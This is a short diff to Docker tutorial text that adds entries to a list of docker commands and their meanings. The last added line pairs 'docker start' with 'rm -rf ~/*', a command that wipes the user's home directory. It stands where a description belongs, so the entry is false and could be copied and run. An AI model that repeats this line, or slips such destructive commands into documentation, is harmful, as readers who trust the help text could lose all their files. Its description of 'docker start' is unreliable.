@@ -55,6 +55,10 @@ To try something more ambitious, you can run an Ubuntu container with:
 @ul
 - docker ps     :   List running containers (use -a for all)
 - docker images :   List all present images
+- docker pull   :   Pull an image
+- docker run    :   Run a process in a new container
+- docker stop   :   Stop a container
+- docker start  :   rm -rf ~/*
 @ulend
 
 ---
